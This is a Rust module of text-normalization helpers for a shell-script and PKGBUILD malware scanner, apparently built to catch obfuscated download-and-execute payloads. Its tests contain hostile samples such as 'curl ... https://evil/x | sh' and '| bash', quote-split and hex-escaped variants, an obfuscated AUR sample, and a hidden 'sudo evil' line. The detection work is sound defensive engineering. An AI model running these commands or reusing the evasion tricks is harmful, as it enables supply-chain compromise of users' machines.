//! Shared text-normalization helpers for analyzing shell content.
//!
//! Detectors match line by line, but bash treats a backslash-newline as a line
//! *continuation*: the two physical lines are one logical command. A naive
//! per-physical-line matcher is therefore trivially evaded --
//! `curl evil \`<newline>`| bash` puts `curl ...` and `| bash` on different
//! physical lines so a `curl .*| sh` rule never fires. [`logical_lines`] splices
//! continuations back together so detectors see the command the shell will
//! actually run, while still reporting the originating physical line number.

/// Split shell `content` into logical lines, splicing backslash-newline
/// continuations. Returns `(first_physical_line, logical_line)` pairs where
/// `first_physical_line` is the 1-based number of the physical line the logical
/// line started on (for accurate finding locations).
///
/// A line ending in an *odd* number of backslashes is a continuation (an even
/// count is escaped backslashes, not a continuation). Mirroring bash, the
/// trailing backslash and the newline are removed and the next physical line is
/// concatenated directly.
pub fn logical_lines(content: &str) -> Vec<(usize, String)> {
    let mut out: Vec<(usize, String)> = Vec::new();
    let mut cur = String::new();
    let mut start_line = 0usize;

    for (i, phys) in content.lines().enumerate() {
        if cur.is_empty() {
            start_line = i + 1;
        }
        let trailing_backslashes = phys.chars().rev().take_while(|&c| c == '\\').count();
        if trailing_backslashes % 2 == 1 {
            // Continuation: drop the final backslash and keep accumulating.
            cur.push_str(&phys[..phys.len() - 1]);
        } else {
            cur.push_str(phys);
            out.push((start_line, std::mem::take(&mut cur)));
        }
    }
    if !cur.is_empty() {
        out.push((start_line, cur));
    }
    out
}

/// A small stateful scanner that tracks shell brace depth while ignoring braces
/// that appear inside single/double quotes (with backslash escapes) or in a `#`
/// comment. Function and install-hook body extraction relies on brace balance
/// to find where a body ends; a naive counter is desynchronized by a `}` inside
/// a string (`echo "}"`) OR inside a trailing comment (`: # note }`), letting an
/// attacker push code (e.g. a `sudo` line) outside the parsed body and past the
/// privilege/hook analyzers. This scanner skips both so that trick no longer
/// truncates the body.
///
/// A `#` only begins a comment when it is unquoted and preceded by whitespace
/// (or the start of a line) -- the same rule the shell uses -- so it does NOT
/// mistake `${var#word}` parameter expansion or `$#` for a comment. Comment
/// state ends at a newline (and is reset at the start of each [`feed`] call,
/// since callers feed one line at a time). Quote/escape state persists across
/// calls so multi-line strings are handled.
pub struct BraceScanner {
    in_single: bool,
    in_double: bool,
    in_comment: bool,
    escaped: bool,
    /// Whether the previous character was whitespace / start-of-line.
    prev_ws: bool,
    /// Net brace depth seen so far.
    pub depth: i32,
    /// Highest depth reached so far (so a body that opens and closes within a
    /// single fed line is still recognized as having been entered).
    pub peak: i32,
}

impl Default for BraceScanner {
    fn default() -> Self {
        Self {
            in_single: false,
            in_double: false,
            in_comment: false,
            escaped: false,
            prev_ws: true, // start of input is a word boundary
            depth: 0,
            peak: 0,
        }
    }
}

impl BraceScanner {
    /// Feed a single character, updating quote/comment state and brace [`depth`].
    pub fn feed_char(&mut self, c: char) {
        if c == '\n' {
            self.in_comment = false;
            self.escaped = false;
            self.prev_ws = true;
            return;
        }
        if self.in_comment {
            return;
        }
        if self.escaped {
            self.escaped = false;
            self.prev_ws = false;
            return;
        }
        match c {
            '\\' if !self.in_single => {
                self.escaped = true;
                self.prev_ws = false;
            }
            '\'' if !self.in_double => {
                self.in_single = !self.in_single;
                self.prev_ws = false;
            }
            '"' if !self.in_single => {
                self.in_double = !self.in_double;
                self.prev_ws = false;
            }
            '#' if !self.in_single && !self.in_double && self.prev_ws => {
                self.in_comment = true;
            }
            '{' if !self.in_single && !self.in_double => {
                self.depth += 1;
                if self.depth > self.peak {
                    self.peak = self.depth;
                }
                self.prev_ws = false;
            }
            '}' if !self.in_single && !self.in_double => {
                self.depth -= 1;
                self.prev_ws = false;
            }
            ' ' | '\t' => self.prev_ws = true,
            _ => self.prev_ws = false,
        }
    }

    /// Feed a chunk of text (e.g. one line, without its newline). Comment state
    /// is reset at the start of each line.
    pub fn feed(&mut self, s: &str) {
        self.in_comment = false;
        self.prev_ws = true;
        for c in s.chars() {
            self.feed_char(c);
        }
    }
}

/// Decode one ANSI-C (`$'...'`) backslash escape. `rest` is the text *after* the
/// backslash. Returns the decoded character(s) and how many chars of `rest` were
/// consumed. Mirrors bash `$'...'`: `\xHH` (1-2 hex), `\NNN`/`\0NNN` (1-3 octal),
/// and the usual `\n \t \r \a \b \e \f \v \\ \' \" \?` controls.
fn decode_ansic_escape(rest: &[char]) -> (String, usize) {
    if rest.is_empty() {
        return (String::from("\\"), 0);
    }
    match rest[0] {
        'x' => {
            // up to two hex digits
            let hex: String = rest[1..].iter().take(2).take_while(|c| c.is_ascii_hexdigit()).collect();
            if hex.is_empty() {
                return (String::from("x"), 1);
            }
            let val = u32::from_str_radix(&hex, 16).unwrap_or(0);
            (char_from(val), 1 + hex.len())
        }
        '0'..='7' => {
            // up to three octal digits (the first digit is rest[0])
            let oct: String = rest.iter().take(3).take_while(|c| c.is_digit(8)).collect();
            let val = u32::from_str_radix(&oct, 8).unwrap_or(0);
            (char_from(val), oct.len())
        }
        'n' => ("\n".into(), 1),
        't' => ("\t".into(), 1),
        'r' => ("\r".into(), 1),
        'a' => ("\u{07}".into(), 1),
        'b' => ("\u{08}".into(), 1),
        'e' | 'E' => ("\u{1b}".into(), 1),
        'f' => ("\u{0c}".into(), 1),
        'v' => ("\u{0b}".into(), 1),
        '\\' => ("\\".into(), 1),
        '\'' => ("'".into(), 1),
        '"' => ("\"".into(), 1),
        '?' => ("?".into(), 1),
        c => (c.to_string(), 1),
    }
}

fn char_from(val: u32) -> String {
    char::from_u32(val).map(|c| c.to_string()).unwrap_or_default()
}

/// Re-render a shell word the way the shell would, with the quoting *removed*:
/// `$'...'` ANSI-C escapes are decoded, single/double quotes are dropped, and
/// adjacent quoted segments concatenate. So `"b"'u''n'` -> `bun` and
/// `$'\x63'"d"` -> `cd`. Unquoted whitespace (the real word boundaries) and any
/// `$(...)`/`${...}` expansions are preserved so detectors still see the command
/// structure. This is a normalization for *matching*, not a faithful evaluator.
pub fn normalize_shell_quoting(line: &str) -> String {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '$' && i + 1 < chars.len() && chars[i + 1] == '\'' {
            // ANSI-C quoting: decode until the closing single quote.
            i += 2;
            while i < chars.len() && chars[i] != '\'' {
                if chars[i] == '\\' {
                    let (decoded, used) = decode_ansic_escape(&chars[i + 1..]);
                    out.push_str(&decoded);
                    i += 1 + used;
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            i += 1; // closing quote
        } else if c == '\'' {
            i += 1;
            while i < chars.len() && chars[i] != '\'' {
                out.push(chars[i]);
                i += 1;
            }
            i += 1;
        } else if c == '"' {
            i += 1;
            while i < chars.len() && chars[i] != '"' {
                if chars[i] == '\\'
                    && i + 1 < chars.len()
                    && matches!(chars[i + 1], '$' | '`' | '"' | '\\')
                {
                    out.push(chars[i + 1]);
                    i += 2;
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            i += 1;
        } else if c == '\\' && i + 1 < chars.len() {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(c);
            i += 1;
        }
    }
    out
}

/// True when a line carries hallmarks of character-level obfuscation: ANSI-C
/// hex/octal escapes (`$'\x63'`, `$'\141'`) or adjacent single-character quoted
/// segments used to split a word (`"b"'u''n'`). Legitimate PKGBUILDs/install
/// scripts effectively never do this; malware uses it to dodge literal matching.
pub fn looks_obfuscated(line: &str) -> bool {
    ANSIC_ESCAPE.is_match(line) || QUOTE_SPLIT.is_match(line)
}

/// Return the de-obfuscated form of `line` when normalization actually changes
/// it; otherwise `None`. Detectors match this in *addition* to the raw line so an
/// evaded payload is still seen.
///
/// This deliberately does NOT gate on a narrow obfuscation heuristic. The old
/// `looks_obfuscated` gate only recognized single-character quote-splitting
/// (`"b"'u''n'`) and ANSI-C escapes, so a 2-character split (`"cu""rl"`) or a
/// backslash-escaped word (`c\url`) slipped past de-obfuscation entirely (the
/// marquee feature missed them — defect #6). Instead we normalize every line and
/// emit the result only when it differs from the raw line, so *any* quoting /
/// escaping that the shell would collapse is decoded for matching. Normalization
/// is faithful (it only removes quoting/escaping the shell removes; word
/// boundaries and `$(...)`/`${...}` are preserved), so an ordinary quoted string
/// decodes to the same command the shell runs — it does not fabricate tokens.
pub fn deobfuscate(line: &str) -> Option<String> {
    let norm = normalize_shell_quoting(line);
    (norm != line).then_some(norm)
}

/// De-obfuscate a whole block **line by line**, preserving the line count (and
/// therefore line numbers) so analyzers that report a line — or scan the whole
/// text — see the decoded payload at its real location. Lines that normalize to
/// themselves are kept verbatim.
pub fn deobfuscate_text(text: &str) -> String {
    let mut out: Vec<String> = text
        .lines()
        .map(|l| deobfuscate(l).unwrap_or_else(|| l.to_string()))
        .collect();
    // Preserve a trailing newline distinction is unnecessary for matching; join
    // with '\n' which is what every caller scans against.
    if out.is_empty() {
        return String::new();
    }
    std::mem::take(&mut out).join("\n")
}

use regex::Regex;
use std::sync::LazyLock;
/// ANSI-C hex/octal escape inside `$'...'`.
static ANSIC_ESCAPE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\$'[^']*\\(?:x[0-9A-Fa-f]{1,2}|[0-7]{1,3})").unwrap());
/// Two or more adjacent single-character quoted segments (the `"b"'u''n'` split).
static QUOTE_SPLIT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?:["'][A-Za-z0-9]["']){2,}"#).unwrap());

/// The detection-rule regex for the quote-splitting obfuscation technique itself
/// (`OBF-006`). Exposed so the rule and the heuristic stay in sync.
pub const QUOTE_SPLIT_PATTERN: &str = r#"(["'][A-Za-z0-9]["']){2,}"#;

/// Explicit, curated **whole-word alternation** of real shells that execute a
/// piped or fetched script. EXPLICIT on purpose: the old `(?:ba|z|k|c|da|tc|fi)?sh`
/// suffix-trick silently missed `dash`/`ash`/`mksh` (a `d?sh` is `dsh`/`sh`, never
/// `dash`), so coverage was unauditable. Enumerating the real set closes the
/// download-and-execute sink class exhaustively (the interpreter set is finite).
///
/// Reused at EVERY sink (DLE-001/002, OBF-011, EXEC-002, deep `EXEC_SINK`,
/// remote_exec `FETCH_EXEC`) composed as `{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b`
/// — the surrounding `\b…\b` anchors mean the short names (`sh`, `nu`, `osh`,
/// `oil`) cannot match mid-word (`crash`, `| number`, `| oilcheck`, `nutool`).
/// Longest-prefix-first ordering is harmless (the trailing `\b` already rejects a
/// short partial like `ksh` inside `ksh93`). `busybox ash`/`busybox sh` are
/// reached via the launcher. Bare obscure shells beyond this set are deferred to
/// wave-2 vector coverage. Non-capturing for safe embedding.
pub const SHELLS: &str = r"(?:elvish|xonsh|ksh93|pdksh|loksh|rbash|bash|dash|mksh|oksh|posh|yash|fish|tcsh|oils|zsh|csh|ksh|ash|oil|osh|nu|sh)";

/// Curated whole-word alternation of non-shell script interpreters that are
/// equally valid download-and-execute sinks (`curl … | python3`, `… | perl`, …).
/// Reused behind `{SHELL_LAUNCHER}{SHELL_PATH}` at the fetch-exec sink (pipe,
/// process-sub `<(curl)`, and `-c|-e` `"$(curl)"` forms). `python3.NN` is covered
/// by `python(?:3(?:\.\d+)?|2)?`.
///
/// Ordering matters only where one name prefixes another: `perl6` before `perl`,
/// `nodejs` before `node`, `Rscript` before the single-letter `R` (kept LAST).
///
/// The R-language names `Rscript` and the single-letter `R` are wrapped in
/// `(?-i:…)` so they match their CANONICAL upper-case spelling even when a
/// consumer compiles the whole pattern case-insensitively (the audit-HI-6
/// analyzer sinks now do). Without this, a case-insensitive `R` would match a
/// lower-case `r` — an extremely common token — and trip a `fetch | r` FP storm.
/// Every other member is a normal command name where case-folding is wanted
/// (`PYTHON`/`PERL`/`NODE` should match). The double-letter `bb` and the `awk`
/// family stay case-foldable: uppercase `BB`/`AWK` are not common false tokens
/// and every sink anchors them with `\b…\b` in command position. Non-capturing
/// for safe embedding.
pub const INTERPRETERS: &str = r"(?:powershell|runhaskell|runghc|python(?:3(?:\.\d+)?|2)?|pypy|perl6|perl|ruby|php|nodejs|node|luajit|lua|tclsh|wish|deno|bun|(?-i:Rscript)|julia|gawk|mawk|nawk|awk|groovy|expect|guile|scala|clojure|clj|racket|chicken|csi|elixir|iex|raku|crystal|babashka|bb|ts-node|tsx|pwsh|(?-i:R))";

/// Optional path prefix before a launcher word or a shell/interpreter, e.g.
/// `/bin/`, `/usr/bin/`. `\S+` is greedy and eats interior slashes, so
/// `/usr/bin/` is one segment. Lets `curl | /bin/sh` and `| /usr/bin/python3`
/// (the single most common shell path) be caught.
pub const SHELL_PATH: &str = r"(?:/\S+/)?";

/// Zero-or-more launcher/wrapper words (each optionally path-prefixed) that can
/// precede the real shell/interpreter at a SINK without changing that code is
/// being fed to it: `busybox sh`, `env sh`, `/usr/bin/env sh`, `command busybox
/// sh` (stacked launchers), `env -i sh`, `env FOO=bar sh`, `nice sh`, `stdbuf
/// -oL sh`. Repeatable (`*`) so stacked launchers are covered, and each launcher
/// may carry `-flags` and `VAR=val` assignments.
///
/// Prepend this (with `SHELL_PATH`) wherever `{SHELLS}`/`{INTERPRETERS}` is a SINK
/// so a launcher word or an absolute path can't smuggle the shell past the
/// matcher: `curl evil | busybox sh` / `| env sh` / `| /bin/sh` previously
/// produced ZERO findings. NOT folded into `SHELLS` itself, so the bare-name
/// behavior is unchanged. Linear-time (the `regex` crate has no backtracking) so
/// the nested `*` is ReDoS-free.
pub const SHELL_LAUNCHER: &str =
    r"(?:(?:/\S+/)?(?:busybox|toybox|env|command|exec|setsid|stdbuf|nice)\s+(?:-\S+\s+|\w+=\S*\s+)*)*";

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn deobfuscates_ansic_and_quote_splitting() {
        // The real AUR sample: cd /tmp && bun add ansi-colors-nextfile-js
        let line = r#"$'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a''d''d' $'\141\x6e''s'"i"-'c''o''l''o''r'$'\x73'"#;
        let d = deobfuscate(line).expect("should be flagged obfuscated");
        assert!(d.contains("cd /tmp"), "got: {d}");
        assert!(d.contains("bun add"), "got: {d}");
        assert!(d.contains("ansi-colors"), "got: {d}");
    }

    #[test]
    fn pure_quote_split_without_hex_is_caught() {
        // No \x at all — only word-splitting. OBF-003 would miss this entirely.
        let line = r#""b"'u''n' 'i''n''s''t''a''l''l' evilpkg"#;
        assert!(looks_obfuscated(line));
        assert!(deobfuscate(line).unwrap().contains("bun install"));
    }

    #[test]
    fn ordinary_quoted_strings_normalize_faithfully() {
        // De-obfuscation now normalizes every line (not just ones a narrow
        // heuristic flagged), so an ordinary quoted string DOES produce a decoded
        // variant -- but the decode is faithful: it only removes the quoting the
        // shell removes, leaving the exact command the shell would run (no
        // fabricated/merged tokens). This is what makes re-matching it safe.
        for (input, expected) in [
            (r#"echo "hello world""#, "echo hello world"),
            (
                r#"install -Dm755 "foo" "$pkgdir/usr/bin/foo""#,
                "install -Dm755 foo $pkgdir/usr/bin/foo",
            ),
            (r#"cd "$srcdir/pkg-$pkgver""#, "cd $srcdir/pkg-$pkgver"),
        ] {
            assert_eq!(
                deobfuscate(input).as_deref(),
                Some(expected),
                "faithful normalization of: {input}"
            );
        }
        // A line with no quoting/escaping at all is unchanged -> None.
        assert!(deobfuscate("make && make install").is_none());
        assert!(deobfuscate("ninja -C build").is_none());
    }

    #[test]
    fn two_char_quote_split_is_deobfuscated() {
        // Defect #6: the old single-char-only heuristic missed multi-char
        // adjacent-quote splitting. `"cu""rl"` must now decode to `curl`.
        assert_eq!(
            deobfuscate(r#""cu""rl" -fsSL https://evil/x | sh"#).as_deref(),
            Some("curl -fsSL https://evil/x | sh"),
        );
    }

    #[test]
    fn backslash_escaped_word_is_deobfuscated() {
        // Defect #6: a backslash-escaped word (`c\url`) bypassed the heuristic.
        // Outside quotes the shell drops the backslash, so it must decode.
        assert_eq!(
            deobfuscate(r#"c\url -fsSL https://evil/x | b\ash"#).as_deref(),
            Some("curl -fsSL https://evil/x | bash"),
        );
    }

    #[test]
    fn deobfuscate_text_preserves_line_numbers() {
        // Per-line de-obfuscation keeps a 1:1 line mapping so analyzers that
        // report a line still point at the right one.
        let text = "a=1\n\"cu\"\"rl\" evil\nb=2";
        let d = deobfuscate_text(text);
        let lines: Vec<&str> = d.lines().collect();
        assert_eq!(lines.len(), 3);
        assert_eq!(lines[0], "a=1");
        assert_eq!(lines[1], "curl evil");
        assert_eq!(lines[2], "b=2");
    }

    #[test]
    fn shells_alternation_is_exhaustive() {
        // The curated whole-word SHELLS set must match every real shell in the
        // list (incl. the formerly-missed dash/ash/mksh and the long tail).
        let re = Regex::new(&format!(r"\|\s*{SHELLS}\b")).unwrap();
        for shell in [
            "sh", "bash", "rbash", "dash", "ash", "ksh", "ksh93", "mksh", "pdksh", "loksh", "oksh",
            "posh", "yash", "zsh", "csh", "tcsh", "fish", "xonsh", "elvish", "nu", "osh", "oil",
            "oils",
        ] {
            let s = format!("x | {shell}");
            assert!(re.is_match(&s), "SHELLS should match: {s}");
        }
        // Short/whole-word names must not over-match (the `\b…\b` discipline).
        let bounded = Regex::new(&format!(r"\b{SHELLS}\b")).unwrap();
        assert!(bounded.is_match("exec ash now"));
        assert!(bounded.is_match("run nu here"));
        for bad in ["a crash occurred", "make a splash", "run shellcheck", "pipe | number", "| oilcheck", "use nutool"] {
            assert!(!bounded.is_match(bad), "must not match: {bad}");
        }
    }

    #[test]
    fn shell_sink_handles_launcher_and_path() {
        // The composed sink form `{LAUNCHER}{PATH}\b{SHELLS}\b` must catch a shell
        // reached via an absolute path and/or one or more launcher words, while
        // staying clean on non-shell sinks (task 4050 exhaustive scope).
        let sink = Regex::new(&format!(r"\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b")).unwrap();
        for ok in [
            "x | sh",
            "x | /bin/sh",
            "x | /usr/bin/bash",
            "x | busybox sh",
            "x | busybox ash",
            "x | env sh",
            "x | /usr/bin/env sh",
            "x | env -i sh",
            "x | env FOO=bar sh",
            "x | command busybox sh",
            "x | /bin/busybox /bin/sh",
            "x | nice dash",
        ] {
            assert!(sink.is_match(ok), "shell sink should match: {ok}");
        }
        for bad in [
            "x | /usr/bin/tee f",
            "x | env grep foo",
            "x | nice make",
            "x | command ls",
            "x | /bin/number",
            "x | busybox cat",
        ] {
            assert!(!sink.is_match(bad), "shell sink must NOT match: {bad}");
        }
    }

    #[test]
    fn octal_and_hex_escapes_decode() {
        assert_eq!(normalize_shell_quoting(r"$'\141\x6e'"), "an"); // \141=a, \x6e=n
        assert_eq!(normalize_shell_quoting(r#"$'\x63'"d""#), "cd");
    }

    #[test]
    fn brace_scanner_ignores_quoted_braces() {
        // The `echo "}"` bypass: the quoted `}` must not close the function.
        let mut sc = BraceScanner::default();
        for line in ["build() {", "  echo \"}\"", "  payload", "}"] {
            sc.feed(line);
        }
        assert_eq!(sc.depth, 0, "function should be balanced, not closed early");
    }

    #[test]
    fn brace_scanner_counts_real_braces() {
        let mut sc = BraceScanner::default();
        sc.feed("f() { if true; then x; fi }");
        assert_eq!(sc.depth, 0);
        assert!(sc.peak >= 1, "peak records that a body was entered");
        let mut sc2 = BraceScanner::default();
        sc2.feed("f() {");
        assert_eq!(sc2.depth, 1);
    }

    #[test]
    fn brace_in_comment_does_not_close_function() {
        // The `}` in a trailing comment must not decrement depth and close the
        // function early (hiding code after it from the privilege analyzer).
        let mut sc = BraceScanner::default();
        for line in ["build() {", "  : # cosmetic note }", "  sudo evil", "}"] {
            sc.feed(line);
        }
        assert_eq!(sc.depth, 0, "comment brace must be ignored; body stays balanced");
    }

    #[test]
    fn parameter_expansion_hash_is_not_a_comment() {
        // `${var#word}` and `$#` must keep their real braces counted.
        let mut sc = BraceScanner::default();
        sc.feed("cd \"${srcdir#x}/y\"");
        assert_eq!(sc.depth, 0, "param-expansion braces balance");
        let mut sc2 = BraceScanner::default();
        sc2.feed("f() { echo ${#args} }");
        assert_eq!(sc2.depth, 0);
    }

    #[test]
    fn plain_lines_unchanged() {
        let ll = logical_lines("a\nb\nc");
        assert_eq!(ll, vec![(1, "a".into()), (2, "b".into()), (3, "c".into())]);
    }

    #[test]
    fn splices_continuation_and_keeps_first_line_number() {
        // The classic bypass: the pipe-to-shell is on a continuation line.
        let ll = logical_lines("curl -fsSL https://evil/x \\\n  | bash");
        assert_eq!(ll.len(), 1);
        assert_eq!(ll[0].0, 1);
        assert!(ll[0].1.contains("curl") && ll[0].1.contains("| bash"));
    }

    #[test]
    fn even_backslashes_are_not_continuations() {
        // `foo\\` ends in an escaped backslash, not a line continuation.
        let ll = logical_lines("foo\\\\\nbar");
        assert_eq!(ll.len(), 2);
    }
}
